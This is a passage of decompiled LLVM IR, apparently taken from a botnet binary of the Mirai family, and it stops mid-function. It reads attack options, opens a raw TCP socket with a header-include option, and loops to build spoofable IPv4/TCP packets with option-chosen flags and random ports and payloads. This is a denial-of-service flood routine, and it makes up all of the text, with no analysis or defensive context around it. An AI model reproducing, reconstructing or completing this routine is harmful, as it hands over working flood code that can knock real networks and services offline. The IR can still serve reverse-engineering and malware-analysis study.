  %v4_bb54 = inttoptr i32 %v0_bb40 to i32*
  %v5_bb54 = call i32 @attack_get_opt_int(i32 %v0_bb50, i32* %v4_bb54, i32 4, i32 64)
  %v1_bb5c = urem i32 %v5_bb54, 256
  store i32 %v1_bb5c, i32* %ip.global-to-local, align 4
  %v0_bb60 = load i32, i32* @r5, align 4
  store i32 %v0_bb60, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bb6c = load i32, i32* @r4, align 4
  store i32 %v0_bb6c, i32* %r0.global-to-local, align 4
  %v6_bb74 = inttoptr i32 %v0_bb60 to i32*
  %v7_bb74 = call i32 @attack_get_opt_int(i32 %v0_bb6c, i32* %v6_bb74, i32 5, i32 0)
  %v1_bb80 = urem i32 %v7_bb74, 256
  store i32 %v1_bb80, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_bb8c = load i32, i32* @r5, align 4
  store i32 %v0_bb8c, i32* %r1.global-to-local, align 4
  %v0_bb90 = load i32, i32* @r4, align 4
  store i32 %v0_bb90, i32* %r0.global-to-local, align 4
  %v5_bb98 = inttoptr i32 %v0_bb8c to i32*
  %v6_bb98 = call i32 @attack_get_opt_int(i32 %v0_bb90, i32* %v5_bb98, i32 6, i32 65535)
  %v0_bba0 = load i32, i32* @r5, align 4
  store i32 %v0_bba0, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_bb98, i32* @r6, align 4
  %v0_bbb0 = load i32, i32* @r4, align 4
  store i32 %v0_bbb0, i32* %r0.global-to-local, align 4
  %v4_bbb4 = inttoptr i32 %v0_bba0 to i32*
  %v5_bbb4 = call i32 @attack_get_opt_int(i32 %v0_bbb0, i32* %v4_bbb4, i32 7, i32 65535)
  %v0_bbbc = load i32, i32* @r5, align 4
  store i32 %v0_bbbc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_bbb4, i32* @sl, align 4
  %v0_bbcc = load i32, i32* @r4, align 4
  store i32 %v0_bbcc, i32* %r0.global-to-local, align 4
  %v4_bbd0 = inttoptr i32 %v0_bbbc to i32*
  %v5_bbd0 = call i32 @attack_get_opt_int(i32 %v0_bbcc, i32* %v4_bbd0, i32 17, i32 65535)
  %v0_bbdc = load i32, i32* @r5, align 4
  store i32 %v0_bbdc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_bbe8 = load i32, i32* @r4, align 4
  store i32 %v0_bbe8, i32* %r0.global-to-local, align 4
  %v5_bbec = inttoptr i32 %v0_bbdc to i32*
  %v6_bbec = call i32 @attack_get_opt_int(i32 %v0_bbe8, i32* %v5_bbec, i32 18, i32 65535)
  %v0_bbf0 = load i32, i32* @r5, align 4
  store i32 %v0_bbf0, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc00 = load i32, i32* @r4, align 4
  store i32 %v0_bc00, i32* %r0.global-to-local, align 4
  %v5_bc04 = inttoptr i32 %v0_bbf0 to i32*
  %v6_bc04 = call i32 @attack_get_opt_int(i32 %v0_bc00, i32* %v5_bc04, i32 11, i32 0)
  %v0_bc08 = load i32, i32* @r5, align 4
  store i32 %v0_bc08, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bc18 = load i32, i32* @r4, align 4
  store i32 %v0_bc18, i32* %r0.global-to-local, align 4
  %v5_bc1c = inttoptr i32 %v0_bc08 to i32*
  %v6_bc1c = call i32 @attack_get_opt_int(i32 %v0_bc18, i32* %v5_bc1c, i32 12, i32 1)
  %v0_bc20 = load i32, i32* @r5, align 4
  store i32 %v0_bc20, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc30 = load i32, i32* @r4, align 4
  store i32 %v0_bc30, i32* %r0.global-to-local, align 4
  %v5_bc34 = inttoptr i32 %v0_bc20 to i32*
  %v6_bc34 = call i32 @attack_get_opt_int(i32 %v0_bc30, i32* %v5_bc34, i32 13, i32 0)
  %v0_bc38 = load i32, i32* @r5, align 4
  store i32 %v0_bc38, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc48 = load i32, i32* @r4, align 4
  store i32 %v0_bc48, i32* %r0.global-to-local, align 4
  %v5_bc4c = inttoptr i32 %v0_bc38 to i32*
  %v6_bc4c = call i32 @attack_get_opt_int(i32 %v0_bc48, i32* %v5_bc4c, i32 14, i32 0)
  %v0_bc50 = load i32, i32* @r5, align 4
  store i32 %v0_bc50, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc60 = load i32, i32* @r4, align 4
  store i32 %v0_bc60, i32* %r0.global-to-local, align 4
  %v5_bc64 = inttoptr i32 %v0_bc50 to i32*
  %v6_bc64 = call i32 @attack_get_opt_int(i32 %v0_bc60, i32* %v5_bc64, i32 15, i32 0)
  %v0_bc68 = load i32, i32* @r5, align 4
  store i32 %v0_bc68, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc78 = load i32, i32* @r4, align 4
  store i32 %v0_bc78, i32* %r0.global-to-local, align 4
  %v5_bc7c = inttoptr i32 %v0_bc68 to i32*
  %v6_bc7c = call i32 @attack_get_opt_int(i32 %v0_bc78, i32* %v5_bc7c, i32 16, i32 0)
  %v0_bc80 = load i32, i32* @r5, align 4
  store i32 %v0_bc80, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_bc90 = load i32, i32* @r4, align 4
  store i32 %v0_bc90, i32* %r0.global-to-local, align 4
  %v5_bc94 = inttoptr i32 %v0_bc80 to i32*
  %v6_bc94 = call i32 @attack_get_opt_int(i32 %v0_bc90, i32* %v5_bc94, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bca4 = load i32, i32* @r5, align 4
  store i32 %v0_bca4, i32* %r1.global-to-local, align 4
  %v0_bca8 = load i32, i32* @r4, align 4
  store i32 %v0_bca8, i32* %r0.global-to-local, align 4
  %v4_bcac = inttoptr i32 %v0_bca4 to i32*
  %v5_bcac = call i32 @attack_get_opt_int(i32 %v0_bca8, i32* %v4_bcac, i32 1, i32 1)
  %v2_bcb8 = load i32, i32* @global_var_25d48.57, align 4
  store i32 %v2_bcb8, i32* %r3.global-to-local, align 4
  %v1_bcbc = urem i32 %v5_bcac, 256
  store i32 %v1_bcbc, i32* %ip.global-to-local, align 4
  %v0_bcc0 = load i32, i32* @r5, align 4
  store i32 %v0_bcc0, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_bcc8 = load i32, i32* @r4, align 4
  store i32 %v0_bcc8, i32* %r0.global-to-local, align 4
  %v5_bcd0 = inttoptr i32 %v0_bcc0 to i32*
  %v6_bcd0 = call i32 @attack_get_opt_ip(i32 %v0_bcc8, i32* %v5_bcd0, i32 25, i32 %v2_bcb8, i32 %v1_bcbc)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_bce4 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_bce4, i32* %r0.global-to-local, align 4
  %v7_bce8 = icmp eq i32 %v3_bce4, -1
  store i1 %v7_bce8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bce8, label %dec_label_pc_c1b0, label %dec_label_pc_bcf4

dec_label_pc_bcf4:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_bcfc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_bcfc, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_bd10 = call i32 @__GI_setsockopt(i32 %v3_bce4, i32 0, i32 3, i32 %v6_bcfc, i32 4)
  store i32 %v5_bd10, i32* %r0.global-to-local, align 4
  %v7_bd14 = icmp eq i32 %v5_bd10, -1
  store i1 %v7_bd14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bd14, label %dec_label_pc_c1a8, label %dec_label_pc_bd1c

dec_label_pc_bd1c:                                ; preds = %dec_label_pc_bcf4
  %v0_bd1c = load i32, i32* @sb, align 4
  %v3_bd1c = mul i32 %v0_bd1c, 65536
  store i32 %v3_bd1c, i32* @r5, align 4
  %v0_bd20 = load i32, i32* @r6, align 4
  %v0_bd24 = load i32, i32* @sl, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_bd2c = urem i32 %v0_bd1c, 65536
  store i32 %v3_bd2c, i32* %r1.global-to-local, align 4
  %v3_bd30 = urem i32 %v0_bd20, 65536
  store i32 %v3_bd30, i32* %r2.global-to-local, align 4
  %v3_bd34 = urem i32 %v0_bd24, 65536
  store i32 %v3_bd34, i32* %r3.global-to-local, align 4
  %v0_bd38 = load i32, i32* @r7, align 4
  %v2_bd38 = icmp eq i32 %v0_bd38, 0
  store i1 %v2_bd38, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bd38, label %dec_label_pc_c1bc, label %dec_label_pc_bd50

dec_label_pc_bd50:                                ; preds = %dec_label_pc_bd1c
  %v3_bd54 = mul i32 %v6_bc94, 65536
  %v1_bd58 = add i32 %v3_bd54, 2621440
  store i32 %v1_bd58, i32* @lr, align 4
  %tmp59 = mul i32 %v0_bd20, 256
  %v3_bd7c = and i32 %tmp59, 65280
  %tmp60 = mul i32 %v0_bd24, 256
  %v3_bd80 = and i32 %tmp60, 65280
  %tmp61 = udiv i32 %v0_bd20, 256
  %v4_bd84 = urem i32 %tmp61, 256
  %v5_bd84 = or i32 %v4_bd84, %v3_bd7c
  store i32 %v5_bd84, i32* @r6, align 4
  %tmp62 = udiv i32 %v0_bd24, 256
  %v4_bd88 = urem i32 %tmp62, 256
  %v5_bd88 = or i32 %v4_bd88, %v3_bd80
  store i32 %v5_bd88, i32* @sl, align 4
  %tmp63 = udiv i32 %v1_bd58, 256
  %v3_bd9c = and i32 %tmp63, 65280
  %tmp64 = mul i32 %v0_bd1c, 256
  %v3_bda0 = and i32 %tmp64, 65280
  %tmp65 = mul i32 %v5_bbd0, 256
  %v3_bda4 = and i32 %tmp65, 65280
  %v1_bda8 = urem i32 %v6_bc04, 2
  %v1_bdac = urem i32 %v6_bc1c, 2
  %tmp66 = udiv i32 %v5_bbd0, 256
  %v4_bdb0 = urem i32 %tmp66, 256
  %v5_bdb0 = or i32 %v4_bdb0, %v3_bda4
  %v4_bdb4 = udiv i32 %v1_bd58, 16777216
  %v5_bdb4 = or i32 %v3_bd9c, %v4_bdb4
  store i32 %v5_bdb4, i32* @sb, align 4
  %tmp67 = udiv i32 %v0_bd1c, 256
  %v4_bdb8 = urem i32 %tmp67, 256
  %v5_bdb8 = or i32 %v4_bdb8, %v3_bda0
  store i32 %v5_bdb8, i32* @fp, align 4
  %v1_bdd4 = urem i32 %v6_bc34, 2
  store i32 %v1_bdd4, i32* %r2.global-to-local, align 4
  %v1_bdd8 = urem i32 %v6_bc4c, 2
  store i32 %v1_bdd8, i32* %r3.global-to-local, align 4
  %v1_bddc = urem i32 %v6_bc64, 2
  store i32 %v1_bddc, i32* %ip.global-to-local, align 4
  %v1_bde0 = urem i32 %v6_bc7c, 2
  store i32 %v1_bde0, i32* %r0.global-to-local, align 4
  %v1_bde4 = urem i32 %v6_bc34, 256
  store i32 %v1_bde4, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul i32 %v6_bb18, 16777216
  %v4_be58 = sdiv i32 %sext, 16777216
  %sext3 = mul i32 %v5_bb54, 16777216
  %v4_be64 = sdiv i32 %sext3, 16777216
  %tmp = sub nsw i32 0, %v1_bdac
  %v4_bed0 = and i32 %tmp, 16
  %tmp72 = sub nsw i32 0, %v1_bdd4
  %v4_beec = and i32 %tmp72, 8
  %tmp73 = sub nsw i32 0, %v1_bdd8
  %v4_bf00 = and i32 %tmp73, 4
  %tmp74 = sub nsw i32 0, %v1_bddc
  %v3_bf14 = and i32 %tmp74, 2
  %v2_bf38 = icmp eq i32 %v1_bde4, 0
  %v1_be60 = trunc i32 %v4_be58 to i8
  %extract.t = trunc i32 %v4_be64 to i8
  br label %dec_label_pc_be04

dec_label_pc_be04:                                ; preds = %bb70, %dec_label_pc_bd50
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_be10 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_be10, i32* %r0.global-to-local, align 4
  %v2_be18 = load i32, i32* @r4, align 4
  %v5_be18 = mul i32 %v2_be18, 4
  %v6_be18 = add i32 %v5_be18, %v2_bb00
  %v7_be18 = inttoptr i32 %v6_be18 to i32*
  store i32 %v2_be10, i32* %v7_be18, align 4
  %v3_be1c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_be1c, i32* %r2.global-to-local, align 4
  %v5_be24 = mul i32 %v3_be1c, 24
  %v1_be28 = load i32, i32* @r8, align 4
  %v2_be28 = add i32 %v1_be28, %v5_be24
  store i32 %v2_be28, i32* %r1.global-to-local, align 4
  store i32 %v2_bb00, i32* %r3.global-to-local, align 4
  %v4_be30 = mul i32 %v3_be1c, 4
  %v5_be30 = add i32 %v4_be30, %v2_bb00
  %v6_be30 = inttoptr i32 %v5_be30 to i32*
  %v7_be30 = load i32, i32* %v6_be30, align 4
  store i32 %v7_be30, i32* @r5, align 4
  %v1_be34 = inttoptr i32 %v7_be30 to i8*
  %v2_be34 = load i8, i8* %v1_be34, align 1
  %tmp75 = urem i8 %v2_be34, 16
  %v1_be38 = zext i8 %tmp75 to i32
  %v1_be3c = or i32 %v1_be38, 64
  store i32 %v1_be3c, i32* %r3.global-to-local, align 4
  %v1_be40 = trunc i32 %v1_be3c to i8
  store i8 %v1_be40, i8* %v1_be34, align 1
  %v0_be44 = load i32, i32* @r5, align 4
  %v1_be44 = inttoptr i32 %v0_be44 to i8*
  %v2_be44 = load i8, i8* %v1_be44, align 1
  %v1_be48 = and i8 %v2_be44, -16
  %v1_be4c = or i8 %v1_be48, 5
  store i32 %v1_bb80, i32* %ip.global-to-local, align 4
  store i8 %v1_be4c, i8* %v1_be44, align 1
  store i32 %v4_be58, i32* %r0.global-to-local, align 4
  %v0_be5c = load i32, i32* %ip.global-to-local, align 4
  %v2_be5c = icmp eq i32 %v0_be5c, 0
  store i1 %v2_be5c, i1* %cpsr_z.global-to-local, align 1
  %v2_be60 = load i32, i32* @r5, align 4
  %v3_be60 = add i32 %v2_be60, 1
  %v4_be60 = inttoptr i32 %v3_be60 to i8*
  store i8 %v1_be60, i8* %v4_be60, align 1
  store i32 %v4_be64, i32* %r2.global-to-local, align 4
  %v0_be68 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_be68, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_be04
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_be6c = load i32, i32* @r5, align 4
  %v4_be6c = add i32 %v3_be6c, 6
  %v5_be6c = inttoptr i32 %v4_be6c to i16*
  store i16 64, i16* %v5_be6c, align 2
  %v0_be74.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t17 = trunc i32 %v0_be74.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_be04, %bb
  %v0_be74.off0 = phi i8 [ %extract.t, %dec_label_pc_be04 ], [ %extract.t17, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_be74 = load i32, i32* @r5, align 4
  %v3_be74 = add i32 %v2_be74, 8
  %v4_be74 = inttoptr i32 %v3_be74 to i8*
  store i8 %v0_be74.off0, i8* %v4_be74, align 1
  %v0_be78 = load i32, i32* %r3.global-to-local, align 4
  %v1_be78 = trunc i32 %v0_be78 to i8
  %v2_be78 = load i32, i32* @r5, align 4
  %v3_be78 = add i32 %v2_be78, 9
  %v4_be78 = inttoptr i32 %v3_be78 to i8*
  store i8 %v1_be78, i8* %v4_be78, align 1
  store i32 %v6_bcd0, i32* %ip.global-to-local, align 4
  %v1_be80 = load i32, i32* @r5, align 4
  %v2_be80 = add i32 %v1_be80, 12
  %v3_be80 = inttoptr i32 %v2_be80 to i32*
  store i32 %v6_bcd0, i32* %v3_be80, align 4
  %v0_be84 = load i32, i32* %r1.global-to-local, align 4
  %v1_be84 = add i32 %v0_be84, 16
  %v2_be84 = inttoptr i32 %v1_be84 to i32*
  %v3_be84 = load i32, i32* %v2_be84, align 4
  store i32 %v3_be84, i32* %r3.global-to-local, align 4
  %v0_be88 = load i32, i32* @sb, align 4
  %v1_be88 = trunc i32 %v0_be88 to i16
  %v2_be88 = load i32, i32* @r5, align 4
  %v3_be88 = add i32 %v2_be88, 2
  %v4_be88 = inttoptr i32 %v3_be88 to i16*
  store i16 %v1_be88, i16* %v4_be88, align 2
  %v0_be8c = load i32, i32* @fp, align 4
  %v1_be8c = trunc i32 %v0_be8c to i16
  %v2_be8c = load i32, i32* @r5, align 4
  %v3_be8c = add i32 %v2_be8c, 4
  %v4_be8c = inttoptr i32 %v3_be8c to i16*
  store i16 %v1_be8c, i16* %v4_be8c, align 2
  %v0_be90 = load i32, i32* %r3.global-to-local, align 4
  %v1_be90 = load i32, i32* @r5, align 4
  %v2_be90 = add i32 %v1_be90, 16
  %v3_be90 = inttoptr i32 %v2_be90 to i32*
  store i32 %v0_be90, i32* %v3_be90, align 4
  %v0_be94 = load i32, i32* @r6, align 4
  %v1_be94 = trunc i32 %v0_be94 to i16
  %v2_be94 = load i32, i32* @r5, align 4
  %v3_be94 = add i32 %v2_be94, 20
  %v4_be94 = inttoptr i32 %v3_be94 to i16*
  store i16 %v1_be94, i16* %v4_be94, align 2
  %v0_be98 = load i32, i32* @r5, align 4
  %v1_be98 = add i32 %v0_be98, 20
  store i32 %v1_be98, i32* @r4, align 4
  %v1_be9c = add i32 %v0_be98, 32
  %v2_be9c = inttoptr i32 %v1_be9c to i8*
  %v3_be9c = load i8, i8* %v2_be9c, align 1
  %v4_be9c = zext i8 %v3_be9c to i32
  store i32 %v4_be9c, i32* %r3.global-to-local, align 4
  %v1_bea0 = add i32 %v0_be98, 33
  %v2_bea0 = inttoptr i32 %v1_bea0 to i8*
  %v3_bea0 = load i8, i8* %v2_bea0, align 1
  %v4_bea0 = zext i8 %v3_bea0 to i32
  store i32 %v1_bda8, i32* %r0.global-to-local, align 4
  %tmp76 = urem i8 %v3_be9c, 16
  %v1_bea8 = zext i8 %tmp76 to i32
  %v1_beac = or i32 %v1_bea8, 80
  store i32 %v1_beac, i32* %r3.global-to-local, align 4
  %v1_beb0 = and i32 %v4_bea0, 223
  store i32 %v1_beb0, i32* %r2.global-to-local, align 4
  %v1_beb4 = trunc i32 %v1_beac to i8
  store i8 %v1_beb4, i8* %v2_be9c, align 1
  %v0_beb8 = load i32, i32* %r2.global-to-local, align 4
  %v1_beb8 = load i32, i32* %r0.global-to-local, align 4
  %v4_beb8 = mul i32 %v1_beb8, 32
  %v5_beb8 = or i32 %v4_beb8, %v0_beb8
  store i32 %v5_beb8, i32* %r2.global-to-local, align 4
  store i32 %v5_bdb0, i32* %r1.global-to-local, align 4
  %v1_bec0 = trunc i32 %v5_beb8 to i8
  %v2_bec0 = load i32, i32* @r4, align 4
  %v3_bec0 = add i32 %v2_bec0, 13
  %v4_bec0 = inttoptr i32 %v3_bec0 to i8*
  store i8 %v1_bec0, i8* %v4_bec0, align 1
  %v0_bec4 = load i32, i32* @r4, align 4
  %v1_bec4 = add i32 %v0_bec4, 13
  %v2_bec4 = inttoptr i32 %v1_bec4 to i8*
  %v3_bec4 = load i8, i8* %v2_bec4, align 1
  %v4_bec4 = zext i8 %v3_bec4 to i32
  store i32 %v1_bdac, i32* %r2.global-to-local, align 4
  %v1_becc = and i32 %v4_bec4, 239
  %v5_bed0 = or i32 %v1_becc, %v4_bed0
  store i32 %v5_bed0, i32* %r3.global-to-local, align 4
  %v0_bed4 = load i32, i32* %r1.global-to-local, align 4
  %v2_bed4 = add i32 %v0_bec4, 4
  %v3_bed4 = inttoptr i32 %v2_bed4 to i32*
  store i32 %v0_bed4, i32* %v3_bed4, align 4
  %v0_bed8 = load i32, i32* @sl, align 4
  %v1_bed8 = trunc i32 %v0_bed8 to i16
  %v2_bed8 = load i32, i32* @r4, align 4
  %v3_bed8 = add i32 %v2_bed8, 2
  %v4_bed8 = inttoptr i32 %v3_bed8 to i16*
  store i16 %v1_bed8, i16* %v4_bed8, align 2
  %v0_bedc = load i32, i32* %r3.global-to-local, align 4
  %v1_bedc = trunc i32 %v0_bedc to i8
  %v2_bedc = load i32, i32* @r4, align 4
  %v3_bedc = add i32 %v2_bedc, 13
  %v4_bedc = inttoptr i32 %v3_bedc to i8*
  store i8 %v1_bedc, i8* %v4_bedc, align 1
  %v0_bee0 = load i32, i32* @r4, align 4
  %v1_bee0 = add i32 %v0_bee0, 13
  %v2_bee0 = inttoptr i32 %v1_bee0 to i8*
  %v3_bee0 = load i8, i8* %v2_bee0, align 1
  %v4_bee0 = zext i8 %v3_bee0 to i32
  store i32 %v1_bdd4, i32* %r3.global-to-local, align 4
  %v1_bee8 = and i32 %v4_bee0, 247
  %v5_beec = or i32 %v1_bee8, %v4_beec
  store i32 %v5_beec, i32* %r2.global-to-local, align 4
  %v1_bef0 = trunc i32 %v5_beec to i8
  store i8 %v1_bef0, i8* %v2_bee0, align 1
  %v0_bef4 = load i32, i32* @r4, align 4
  %v1_bef4 = add i32 %v0_bef4, 13
  %v2_bef4 = inttoptr i32 %v1_bef4 to i8*
  %v3_bef4 = load i8, i8* %v2_bef4, align 1
  %v4_bef4 = zext i8 %v3_bef4 to i32
  store i32 %v1_bdd8, i32* %ip.global-to-local, align 4
  %v1_befc = and i32 %v4_bef4, 251
  %v5_bf00 = or i32 %v1_befc, %v4_bf00
  store i32 %v5_bf00, i32* %r3.global-to-local, align 4
  %v1_bf04 = trunc i32 %v5_bf00 to i8
  store i8 %v1_bf04, i8* %v2_bef4, align 1
  %v0_bf08 = load i32, i32* @r4, align 4
  %v1_bf08 = add i32 %v0_bf08, 13
  %v2_bf08 = inttoptr i32 %v1_bf08 to i8*
  %v3_bf08 = load i8, i8* %v2_bf08, align 1
  %v4_bf08 = zext i8 %v3_bf08 to i32
  store i32 %v1_bddc, i32* %r0.global-to-local, align 4
  %v1_bf10 = and i32 %v4_bf08, 253
  %v4_bf14 = or i32 %v1_bf10, %v3_bf14
  store i32 %v4_bf14, i32* %r2.global-to-local, align 4
  %v1_bf18 = trunc i32 %v4_bf14 to i8
  store i8 %v1_bf18, i8* %v2_bf08, align 1
  %v0_bf1c = load i32, i32* @r4, align 4
  %v1_bf1c = add i32 %v0_bf1c, 13
  %v2_bf1c = inttoptr i32 %v1_bf1c to i8*
  %v3_bf1c = load i8, i8* %v2_bf1c, align 1
  %v4_bf1c = zext i8 %v3_bf1c to i32
  store i32 %v1_bde0, i32* %r1.global-to-local, align 4
  %v1_bf24 = and i32 %v4_bf1c, 254
  %v2_bf28 = or i32 %v1_bf24, %v1_bde0
  store i32 %v2_bf28, i32* %r3.global-to-local, align 4
  %v1_bf2c = trunc i32 %v2_bf28 to i8
  store i8 %v1_bf2c, i8* %v2_bf1c, align 1
  %v0_bf30 = call i32 @rand_next()
  %v1_bf30 = trunc i32 %v0_bf30 to i16
  store i32 %v0_bf30, i32* %r0.global-to-local, align 4
  store i32 %v1_bde4, i32* %r2.global-to-local, align 4
  store i1 %v2_bf38, i1* %cpsr_z.global-to-local, align 1
  %v3_bf44.pre = load i32, i32* @r4, align 4
  br i1 %v2_bf38, label %.thread4, label %bb68

bb68:                                             ; preds = %.thread
  %v2_bf3c = add i32 %v3_bf44.pre, 13
  %v3_bf3c = inttoptr i32 %v2_bf3c to i8*
  %v4_bf3c = load i8, i8* %v3_bf3c, align 1
  %v5_bf3c = zext i8 %v4_bf3c to i32
  %v2_bf40 = or i32 %v5_bf3c, 8
  store i32 %v2_bf40, i32* @r3, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread, %bb68
  %v4_bf44 = add i32 %v3_bf44.pre, 14
  %v5_bf44 = inttoptr i32 %v4_bf44 to i16*
  store i16 %v1_bf30, i16* %v5_bf44, align 2
  store i32 %v6_bc94, i32* %r1.global-to-local, align 4
  %v0_bf4c = load i32, i32* @r5, align 4
  %v1_bf4c = add i32 %v0_bf4c, 40
  store i32 %v1_bf4c, i32* %r0.global-to-local, align 4
  br i1 %v2_bf38, label %bb70, label %bb69

bb69:                                             ; preds = %.thread4
  %v1_bf50 = load i32, i32* @r3, align 4
  %v2_bf50 = trunc i32 %v1_bf50 to i8
  %v3_bf50 = load i32, i32* @r4, align 4
  %v4_bf50 = add i32 %v3_bf50, 13
  %v5_bf50 = inttoptr i32 %v4_bf50 to i8*
  store i8 %v2_bf50, i8* %v5_bf50, align 1
  br label %bb70

bb70:                                             ; preds = %.thread4, %bb69
  %v2_bf54 = inttoptr i32 %v1_bf4c to i16*
  %v3_bf54 = call i32 @rand_str(i16* %v2_bf54, i32 %v6_bc94)
  store i32 %v3_bf54, i32* %r0.global-to-local, align 4
  %v3_bf58 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bf58, i32* %r3.global-to-local, align 4
  %v1_bf5c = add i32 %v3_bf58, 1
  store i32 %v1_bf5c, i32* @r4, align 4
  %v1_bf60 = load i32, i32* @r7, align 4
  %v9_bf60 = icmp eq i32 %v1_bf5c, %v1_bf60
  store i1 %v9_bf60, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bf5c, i32* %stack_var_-44, align 4
  %v5_bf68 = icmp slt i32 %v1_bf5c, %v1_bf60
  br i1 %v5_bf68, label %dec_label_pc_be04, label %dec_label_pc_bf6c

dec_label_pc_bf6c:                                ; preds = %bb70
  store i32 %v6_bc94, i32* %r3.global-to-local, align 4
  %v1_bf70 = add i32 %v6_bc94, 20
  store i32 %v1_bf70, i32* @sb, align 4
  br label %dec_label_pc_bf78

dec_label_pc_bf78:                                ; preds = %dec_label_pc_c1bc, %dec_label_pc_bf6c
  %v0_bf908 = phi i32 [ %v1_bf60, %dec_label_pc_bf6c ], [ 0, %dec_label_pc_c1bc ]
  %stack_var_-140.0 = phi i32 [ %v3_bd54, %dec_label_pc_bf6c ], [ %v3_c1c8, %dec_label_pc_c1bc ]
  %storemerge = add i32 %v6_bc94, 40
  store i32 %storemerge, i32* %fp.global-to-local, align 4
  store i32 %stack_var_-140.0, i32* %r1.global-to-local, align 4
  %v1_bf7c = add i32 %stack_var_-140.0, 1310720
  store i32 %v1_bf7c, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v1_bf7c, 256
  %v3_bf84 = and i32 %tmp71, 65280
  store i32 %v3_bf84, i32* %r3.global-to-local, align 4
  %v4_bf88 = udiv i32 %v1_bf7c, 16777216
  %v5_bf88 = or i32 %v3_bf84, %v4_bf88
  store i32 %v5_bf88, i32* @sl, align 4
  %v3_c128 = icmp eq i32 %v3_bd2c, 65535
  %v2_c18c = icmp eq i32 %v1_bcbc, 0
  %v2_bfc8 = icmp eq i32 %v6_bcd0, -1
  %v7_bfc8 = icmp eq i32 %v6_bcd0, -1
  br label %dec_label_pc_bf8c

dec_label_pc_bf8c:                                ; preds = %dec_label_pc_bf8c, %dec_label_pc_c0a4, %dec_label_pc_bf78
  %v0_bf90 = phi i32 [ %v0_bf908, %dec_label_pc_bf78 ], [ 0, %dec_label_pc_c0a4 ], [ 0, %dec_label_pc_bf8c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bf90 = icmp eq i32 %v0_bf90, 0
  store i1 %v2_bf90, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bf90, label %dec_label_pc_bf8c, label %dec_label_pc_bf9c

dec_label_pc_bf9c:                                ; preds = %dec_label_pc_bf8c, %dec_label_pc_c0a4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bfa0

dec_label_pc_bfa0:                                ; preds = %dec_label_pc_c020, %dec_label_pc_bf9c
  %v1_bfb4 = phi i32 [ %v1_c094, %dec_label_pc_c020 ], [ 0, %dec_label_pc_bf9c ]
  %v5_bfa4 = mul i32 %v1_bfb4, 24
  %v1_bfa8 = load i32, i32* @r8, align 4
  %v2_bfa8 = add i32 %v1_bfa8, %v5_bfa4
  store i32 %v2_bfa8, i32* %r3.global-to-local, align 4
  store i32 %v2_bb00, i32* %ip.global-to-local, align 4
  %v1_bfb0 = add i32 %v2_bfa8, 20
  %v2_bfb0 = inttoptr i32 %v1_bfb0 to i8*
  %v3_bfb0 = load i8, i8* %v2_bfb0, align 1
  %v4_bfb0 = zext i8 %v3_bfb0 to i32
  store i32 %v4_bfb0, i32* %r2.global-to-local, align 4
  %v4_bfb4 = mul i32 %v1_bfb4, 4
  %v5_bfb4 = add i32 %v4_bfb4, %v2_bb00
  %v6_bfb4 = inttoptr i32 %v5_bfb4 to i32*
